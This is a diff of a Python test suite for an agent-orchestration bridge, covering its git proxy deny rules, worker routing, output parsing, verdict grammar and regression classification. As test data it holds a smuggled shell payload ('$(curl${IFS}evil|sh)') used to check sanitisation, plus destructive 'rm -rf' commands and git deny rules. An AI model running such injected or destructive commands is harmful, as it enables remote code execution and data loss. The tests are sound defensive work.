-        _coding_turn(ws)
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        await _code(orch, eid, chan, root, _edits)
         await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
         await orch._expire_attempts(eid)
         from app.models import EffortAttempt
@@ -535,83 +672,118 @@ async def test_case8_attempt_refs_expire_at_delivery(db_url, tmp_path):
         await _shutdown(orch, db)
 
 
-# ── Case 9: every git argv the bridge sends passes the REAL proxy ─────────────────────────────
+# ── Case 9: the proxy table; labels; the ONE worker holding the attempt ───────────────────────
 def test_case9_every_git_argv_passes_the_real_git_proxy():
     import git_proxy
     att = _a()
     table = {" ".join(a): git_proxy.classify(a) for a in att.GIT_ARGVS}
     denied = {k: (d.rule, d.reason) for k, d in table.items() if d.action != "allow"}
     assert denied == {}
-    # the plumbing ao-planrevert round 1 relied on stays denied (the table means something)
     for bad in (["write-tree"], ["update-ref", "x", "y"], ["branch", "-D", "x"],
                 ["-c", "a=b", "status"], ["reset", "--hard", "abc"]):
         assert git_proxy.classify(bad).action == "deny"
 
 
-async def test_case9_the_argvs_actually_sent_are_exactly_the_declared_table(db_url, tmp_path):
-    """The shim logs every git argv a scenario ran; each one's shape is in GIT_ARGVS."""
+def _shape(att, argv):
+    out = []
+    for i, tok in enumerate(argv):
+        if att.is_sha(tok):
+            out.append("SHA")
+        elif tok.startswith("refs/heads/ao-attempts/"):
+            out.append("refs/heads/REF")
+        elif tok.startswith("ao-attempts/"):
+            out.append("REF")
+        elif i > 0 and argv[i - 1] == "-m":
+            out.append("MSG")
+        elif i > 0 and argv[i - 1] == "--" and argv[0] == "--literal-pathspecs":
+            out.append("PATH")
+        elif argv[:2] == ["checkout", "-q"] and i == 2 and tok not in ("--detach", "--", "-b"):
+            out.append("BRANCH")
+        elif argv[:3] == ["checkout", "-q", "-b"] and i == 3:
+            out.append("BRANCH")
+        else:
+            out.append(tok)
+    return tuple(out)
+
+
+async def test_case9_the_argvs_the_bridge_sent_are_exactly_the_declared_table(db_url, tmp_path):
+    """Every git argv the shim logged in a scenario WITHOUT worker checks (those run the
+    worker's own commands) has a declared shape, or is the unchanged check's."""
     import git_proxy
     att = _a()
     ws = LocalWS(tmp_path)
-    await _run(db_url, ws, scenario_discard)
+
+    async def no_checks(orch, ws):
+        _base(ws)
+        eid, chan, root = await _effort(orch)
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        await _code(orch, eid, chan, root, _edits)
+        await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: wrong approach to A1"))
+        return eid
+
+    await _run(db_url, ws, no_checks)
     shapes = {tuple(a) for a in att.GIT_ARGVS}
+    legacy = {("status", "--porcelain"), ("checkout", "--", "."), ("clean", "-fd")}
     sent = [c["argv"] for c in ws.calls()]
     assert sent
-
-    def shape(argv):
-        out = []
-        for i, tok in enumerate(argv):
-            if att.is_sha(tok):
-                out.append("SHA")
-            elif tok.startswith("refs/heads/ao-attempts/"):
-                out.append("refs/heads/REF")
-            elif tok.startswith("ao-attempts/"):
-                out.append("REF")
-            elif i > 0 and argv[i - 1] == "-m":
-                out.append("MSG")
-            elif i > 0 and argv[i - 1] == "--" and argv[0] == "--literal-pathspecs":
-                out.append("PATH")
-            else:
-                out.append(tok)
-        return tuple(out)
-
-    # the UNCHANGED plan-turn write check's own argvs (pre-existing, also proxy-legal)
-    legacy = {("status", "--porcelain"), ("checkout", "--", "."), ("clean", "-fd")}
-    branch = {("checkout", "-q", "master"), ("checkout", "-q", "main")}
-    unknown = sorted({shape(a) for a in sent} - shapes - legacy - branch)
+    unknown = sorted({_shape(att, a) for a in sent} - shapes - legacy)
     assert unknown == []
-    for argv in legacy | branch:
+    for argv in legacy:
         assert git_proxy.classify(list(argv)).action == "allow"
 
 
-async def test_case9_the_audit_records_a_label_not_the_command(db_url):
-    """router.exec_check audits `command[:200]`; the bridge's attempt commands carry a worker's
-    check command and commit paths, so they pass a label instead."""
+async def test_case9_the_audit_records_a_label_not_the_command(db_url, tmp_path):
+    ws = LocalWS(tmp_path)
+    _base(ws)
     orch, db = await _orch(db_url)
+    _wire(orch, ws)
     try:
-        eid, _c, _r = await _effort(orch)
-        orch.harness.check_queue.append((0, "ok", False))
-        # no worker holds this effort's workspace: refused, nothing runs
+        eid, chan, root = await _effort(orch)
+        # no worker holds the effort's workspace yet: refused, nothing runs
         assert await orch._attempt_exec(eid, f"echo {CMD_MARK}") is None
         assert orch.harness.checks == []
-        # the worker focused on it (as a plan or coding wake records it)
-        for row in await orch.scheduler.snapshot():
-            orch.router._ws_focus[row["id"]] = (eid, REPO, "")
-        assert await orch._attempt_exec(eid, f"echo {CMD_MARK}", label="ao-attempt:checks") == "ok"
+        await _code(orch, eid, chan, root, None)
+        assert await orch._attempt_exec(eid, f"echo {CMD_MARK}", label="ao-attempt:checks")
         blob = json.dumps(await _events(orch, eid, "check_exec"))
         assert "ao-attempt:checks" in blob and CMD_MARK not in blob
     finally:
         await _shutdown(orch, db)
 
 
-# ── Case 10: the parser reads open-terminal's real framing, and fails closed ──────────────────
+async def test_case9_two_workers_on_one_effort_reach_the_coding_workspace_or_none(db_url, tmp_path):
+    """The plan wake can land on another pool worker focused on the same effort: attempt
+    commands go to the worker of the last CODING wake, else (ambiguous) nowhere."""
+    orch, db = await _orch(db_url, urls="http://w1:8090,http://w2:8090", workers=2)
+    w1, w2 = LocalWS(tmp_path / "1"), LocalWS(tmp_path / "2", seed=9)
+    _wire(orch, w1, {"http://w1:8090": w1, "http://w2:8090": w2})
+    try:
+        eid, _c, _r = await _effort(orch)
+        async with orch.db.session_factory() as s:
+            rows = (await s.execute(select(WorkerInstance))).scalars().all()
+            ids = {r.base_url: r.id for r in rows}
+            for r in rows:
+                r.session_id = f"sess-{r.id}"
+            await s.commit()
+        for wid in ids.values():
+            orch.router._ws_focus[wid] = (eid, REPO, "")
+        assert await orch.router.focus_target(eid) is None             # ambiguous: fail closed
+        assert await orch._attempt_exec(eid, "echo x") is None
+        orch.router._coding_ws[eid] = ids["http://w2:8090"]
+        assert (await orch.router.focus_target(eid))[0] == ids["http://w2:8090"]
+        orch.harness.checks.clear()
+        assert await orch._attempt_exec(eid, "echo hi")
+        assert {c["base_url"] for c in orch.harness.checks} == {"http://w2:8090"}
+    finally:
+        await _shutdown(orch, db)
+
+
+# ── Case 10: framing ─────────────────────────────────────────────────────────────────────────
 def test_case10_records_survive_chunk_splits_and_the_extra_join_newline():
     import random
     att = _a()
     raw = att.BEGIN + "".join(f"@@N 1\t2\tdir/file_{i}.py N@@" for i in range(300)) + att.END
     for seed in range(20):
-        out = daemon_frame(raw + "\n", "", random.Random(seed))
-        recs = att.records(out)
+        recs = att.records(daemon_frame(raw + "\n", "", random.Random(seed)))
         assert recs is not None and len(recs) == 300
         assert recs[17] == ("N", "1\t2\tdir/file_17.py")
 
@@ -619,30 +791,33 @@ def test_case10_records_survive_chunk_splits_and_the_extra_join_newline():
 def test_case10_truncated_or_missing_markers_are_untrusted():
     att = _a()
     assert att.records("") is None
-    assert att.records("@@HEAD x HEAD@@" + att.END) is None          # no BEGIN (cut to 64 KB)
-    assert att.records(att.BEGIN + "@@HEAD x HEAD@@") is None        # no END (died)
+    assert att.records("@@HEAD x HEAD@@" + att.END) is None
+    assert att.records(att.BEGIN + "@@HEAD x HEAD@@") is None
     assert att.parse_probe(att.BEGIN + "@@HEAD nothex HEAD@@@@DIRTY 0 DIRTY@@" + att.END) is None
+    assert att.parse_check(att.BEGIN + "@@RCA 0 RCA@@" + att.END) is None   # incomplete
 
 
-def test_case10_a_token_shaped_path_is_masked_but_never_trusted_as_another_path():
+def test_case10_an_untrusted_check_is_reported_as_unknown_never_as_no_regression():
     att = _a()
-    tok = "ghp_" + "a" * 36
-    out = daemon_frame(att.BEGIN + f"@@N 1\t0\tfixtures/{tok}.txt N@@@@NT 1 NT@@" + att.END,
-                       "", __import__("random").Random(1))
-    d = att.parse_numstat(out)
-    assert d is not None and tok not in json.dumps(d)                 # display only, masked
+    f = att.classify([{"step": 1, "cmd": "x"}], [None], [{"n": 1, "anchor": "A1"}])
+    assert f["untrusted_checks"] == ["c1"]
+    assert "UNKNOWN, not absent" in att.facts_text(f, None, [{"n": 1, "anchor": "A1"}],
+                                                   [{"step": 1, "cmd": "x"}])
 
 
-# ── Case 11: grammars and the fact classifier ────────────────────────────────────────────────
+# ── Case 11: grammars, facts, ids, the learning record ───────────────────────────────────────
 def test_case11_verdict_grammar_is_strict():
     att = _a()
-    steps = {1, 2}
+    steps = {1, 2, 3}
     assert att.parse_verdict("VERDICT: KEEP 1,2", steps).steps == [1, 2]
     assert att.parse_verdict("VERDICT: KEEP steps 1 and 2", steps).steps == [1, 2]
+    assert att.parse_verdict("VERDICT: KEEP 1-3", steps).steps == [1, 2, 3]
+    assert att.parse_verdict("VERDICT: KEEP 1-2 - both done", steps).steps == [1, 2]
     v = att.parse_verdict("VERDICT: DISCARD 2 deviation: broke A2", steps)
     assert (v.kind, v.steps, v.klass, v.reason) == ("discard", [2], "deviation", "broke A2")
-    for bad in ("", "VERDICT: KEEP 3", "VERDICT: DISCARD 1", "VERDICT: KEEP",
-                "VERDICT: KEEP 1\nVERDICT: DISCARD 1 no-solution: x", "keep 1", "VERDICT: maybe"):
+    for bad in ("", "VERDICT: KEEP 4", "VERDICT: DISCARD 1", "VERDICT: KEEP", "VERDICT: KEEP 3-1",
+                "VERDICT: KEEP 1-4", "VERDICT: KEEP 1\nVERDICT: DISCARD 1 no-solution: x",
+                "keep 1", "VERDICT: maybe"):
         assert att.parse_verdict(bad, steps) is None, bad
 
 
@@ -650,69 +825,139 @@ def test_case11_plan_grammar_requires_an_anchor_per_step():
     att = _a()
     d = att.parse_plan(PLAN_1)
     assert not d.problems and [s["anchor"] for s in d.steps] == ["A1", "A2"]
-    d = att.parse_plan("PLAN:\n1. x [anchor: A9]\n2. y\n")
-    assert len(d.problems) == 2
+    assert len(att.parse_plan("PLAN:\n1. x [anchor: A9]\n2. y\n").problems) == 2
     assert att.parse_plan("PLAN:\n1. x [anchor: A1]", {"A1": "kept"}).problems == []
     assert att.parse_plan("PLAN: nothing remains").nothing_remains
 
 
-def test_case11_facts_regression_vs_new_not_passing_carry_the_anchor():
+def _run_of(att, rca, rcb, start_lines, end_lines):
+    """A CheckRun as the shell would compute it (used to pin the classifier's meaning)."""
+    def split(lines):
+        f, p = set(), set()
+        for st, tid in lines:
+            (f if st == "FAILED" else p).add(tid)
+        return f, p - f
+    fa, pa = split(end_lines)
+    fb, pb = split(start_lines) if start_lines is not None else (set(), set())
+    stat = {t: "F" for t in fb} | {t: "P" for t in pb}
+    j = [(stat.get(t, "A") if start_lines else "U", t) for t in sorted(fa)]
+    order = {"P": 0, "A": 1, "F": 2, "U": 3}
+    j.sort(key=lambda x: order[x[0]])
+    counts = {"NFA": len(fa), "NPA": len(pa), "NFB": len(fb), "NPB": len(pb),
+              "NREG": sum(1 for s, _ in j if s == "P"), "NNEW": sum(1 for s, _ in j if s == "A"),
+              "NSTILL": sum(1 for s, _ in j if s == "F"), "NUNK": sum(1 for s, _ in j if s == "U"),
+              "NFIX": len(fb & pa)}
+    return att.CheckRun(rca=rca, rcb=rcb, counts=counts, listed=j, fixed=sorted(fb & pa),
+                        state=att.State("a" * 40, "main", 0, None))
+
+
+def test_case11_facts_new_test_in_an_existing_file_and_a_renamed_test_are_not_regressions():
     att = _a()
-    checks = [{"step": 1, "cmd": "pytest -v"}]
+    checks = [{"step": 1, "cmd": "pytest -v t.py"}]
     steps = [{"n": 1, "anchor": "A1"}]
-    before = {0: {"rc": 0, "tests": {"t.py::a": "PASSED", "t.py::b": "FAILED"}}}
-    after = {0: {"rc": 1, "tests": {"t.py::a": "FAILED", "t.py::b": "FAILED",
-                                    "n.py::c": "FAILED", "t.py::d": "PASSED"}}}
-    f = att.classify(checks, before, after, steps, {"n.py"})
+    # R1: test_added lives in the SAME existing file; the start ran clean
+    r = _run_of(att, 1, 0, [("PASSED", "t.py::test_old")],
+                [("PASSED", "t.py::test_old"), ("FAILED", "t.py::test_added")])
+    f = att.classify(checks, [r], steps)
+    assert f["regression"] == [] and [x["test"] for x in f["new_not_passing"]] == ["t.py::test_added"]
+    # renamed: test_a (passing) became test_b (failing): new, not a regression; count drop shown
+    r = _run_of(att, 1, 0, [("PASSED", "t.py::test_a"), ("PASSED", "t.py::test_k")],
+                [("FAILED", "t.py::test_b"), ("PASSED", "t.py::test_k")])
+    f = att.classify(checks, [r], steps)
+    assert f["regression"] == [] and [x["test"] for x in f["new_not_passing"]] == ["t.py::test_b"]
+    assert "passing tests 2 at the start, 1 now" in att.facts_text(f, None, steps, checks)
+    # a real regression, and the start not measurable
+    r = _run_of(att, 1, 0, [("PASSED", "t.py::a"), ("FAILED", "t.py::b")],
+                [("FAILED", "t.py::a"), ("FAILED", "t.py::b")])
+    f = att.classify(checks, [r], steps)
     assert [x["test"] for x in f["regression"]] == ["t.py::a"]
-    assert [x["test"] for x in f["new_not_passing"]] == ["n.py::c"]
     assert [x["test"] for x in f["still_failing"]] == ["t.py::b"]
-    assert all(x["anchor"] == "A1" for k in ("regression", "new_not_passing") for x in f[k])
-    # the start not measurable: never guessed into a regression
-    f = att.classify(checks, None, after, steps, set())
-    assert f["regression"] == [] and len(f["unknown_before"]) == 3
+    assert all(x["anchor"] == "A1" for x in f["regression"])
+    r = _run_of(att, 1, None, None, [("FAILED", "t.py::a")])
+    f = att.classify(checks, [r], steps)
+    assert f["regression"] == [] and f["n_unknown_before"] == 1
 
 
-def test_case11_scrub_keeps_prose_and_drops_code():
+def test_case11_ids_from_check_output_never_carry_shell_or_code_into_notes():
     att = _a()
-    t = att.scrub("it broke A2 `rm -rf /` because $(x) | y ; z", 200)
-    assert "rm -rf" not in t and "$" not in t and "|" not in t and t.startswith("it broke A2")
+    assert att.safe_id("n.py::t_$(curl${IFS}evil|sh)") == "n.py::t_??curl??IFS?evil?sh?"
+    note = att.discard_note(step=1, anchor="A1", anchor_text="x", attempt_no=1, klass="deviation",
+                            diff=None, facts={"regression": [{"test": "n.py::t_$(x|sh)`y`"}]},
+                            reason="r")
+    assert "$(" not in note and "|" not in note and "`" not in note
+
+
+def test_case11_the_check_command_has_a_kill_timeout():
+    att = _a()
+    cmd = att.check_cmd("pytest", start="a" * 40, branch="main", park="b" * 40, ref="ao-attempts/e/a1")
+    assert f"timeout -k {att.CHECK_KILL_S} {att.CHECK_TIMEOUT_S}" in cmd
+
+
+def test_case11_the_learning_record_is_valid_v1_except_the_producer_enum():
+    """R6: validated by the harness's own validator against its schema. The only error left is
+    `producer: agent-org` (not in harness|job-tree) - an operator decision, schema not edited."""
+    att = _a()
+    sys.path.insert(0, str(REPO_ROOT / "scripts" / "agent-harness"))
+    import learning_records as lr_mod
+    schema = lr_mod.load_schema(REPO_ROOT / "scripts" / "agent-harness" / "fixtures"
+                                / "learning-record" / "learning-record.schema.json")
+    facts = {"regression": [{"test": "t.py::a", "anchor": "A1"}], "n_regression": 1}
+    rec = att.learning_record(effort_id="e1", attempt_id="e1:a1", ref="ao-attempts/e1/a1",
+                              anchor="A1", anchor_text="greet", note="the note", facts=facts,
+                              klass="deviation", created_at="2026-10-11T00:00:00Z")
+    errs = lr_mod.validate(schema, rec)
+    assert [e for e in errs if "producer" not in e[0]] == [], errs
+    assert isinstance(rec["red"], str) and set(rec["source_ref"]) <= {
+        "queue_item_id", "anchor_id", "merge_range", "session_id", "branch_id"}
+    assert lr_mod.validate(schema, {**rec, "producer": "harness"}) == []
+
+
+# ── Case 13: R2 / R4 scenarios on the framed local workspace ─────────────────────────────────
+async def test_case13_two_big_suites_past_the_64kb_tail_both_regressions_reported(db_url, tmp_path):
+    await _run(db_url, LocalWS(tmp_path), scenario_big_output)
+
+
+async def test_case13_branch_moving_checks_cannot_move_the_kept_branch(db_url, tmp_path):
+    await _run(db_url, LocalWS(tmp_path), scenario_branch_moving_checks)
+
+
+async def test_case13_a_check_that_commits_cannot_survive_a_discard(db_url, tmp_path):
+    await _run(db_url, LocalWS(tmp_path), scenario_branch_moving_discard)
+
+
+async def test_case13_a_check_that_deletes_the_attempt_ref_fails_closed(db_url, tmp_path):
+    ws = LocalWS(tmp_path)
+    _base(ws)
+    orch, db = await _orch(db_url)
+    _wire(orch, ws)
+    try:
+        eid, chan, root = await _effort(orch)
+        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
+        await _code(orch, eid, chan, root, _edits,
+                    _checks_reply("step 1: rm -rf .git/refs/heads/ao-attempts"))
+        await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: x for A1"))
+        assert await orch._event_count(eid, "attempt_restore_failed") == 1
+        assert await orch._event_count(eid, "attempt_discarded") == 0
+        assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")   # not lost
+    finally:
+        await _shutdown(orch, db)
 
 
 # ── Case 12: the real little-coder-open-terminal image, offline ──────────────────────────────
+_REAL = [scenario_keep, scenario_discard, scenario_plan_writes, scenario_big_output,
+         scenario_branch_moving_checks, scenario_branch_moving_discard]
+
+
 @pytest.mark.skipif(not _CONTAINER, reason="set AO_ATTEMPT_OT_CONTAINER to an offline container "
                                            "of the real little-coder-open-terminal image")
-@pytest.mark.parametrize("scenario", [scenario_keep, scenario_discard, scenario_plan_writes],
-                         ids=["keep", "discard", "plan_writes"])
+@pytest.mark.parametrize("scenario", _REAL, ids=[f.__name__[9:] for f in _REAL])
 async def test_case12_real_open_terminal_image(db_url, scenario):
     ws = ContainerWS(_CONTAINER, _KEY)
     await _run(db_url, ws, scenario)
-    log = ws.calls()
-    assert not any("DENIED" in json.dumps(c) or c.get("action") == "deny" for c in log), log
+    assert not any("DENIED" in json.dumps(c) for c in ws.calls())
 
 
 @pytest.mark.skipif(not _CONTAINER, reason="needs AO_ATTEMPT_OT_CONTAINER")
 @pytest.mark.parametrize("run", sorted(C7A_RUNS))
 async def test_case12_real_image_c7a_replay(db_url, run):
-    modified, added = C7A_RUNS[run]
-    ws = ContainerWS(_CONTAINER, _KEY)
-    for p in modified:
-        ws.write(p, f"original {p}\n")
-    ws.git("add", "-A")
-    ws.git("commit", "-q", "-m", "base")
-    orch, db = await _orch(db_url)
-    orch._plan_actions = []
-    _wire(orch, ws, orch._plan_actions)
-    try:
-        eid, chan, root = await _effort(orch)
-        for p in modified:
-            ws.write(p, f"coding turn edit {p}\n")
-        for p in added:
-            ws.write(p, f"coding turn new file {p}\n")
-        assert await _gate(orch, eid, chan, root, C7A_PLAN) is not None
-        for p in modified:
-            assert ws.read(p) == f"coding turn edit {p}\n", p
-        for p in added:
-            assert ws.read(p) == f"coding turn new file {p}\n", p
-    finally:
-        await _shutdown(orch, db)
+    await _c7a(db_url, ContainerWS(_CONTAINER, _KEY), run)
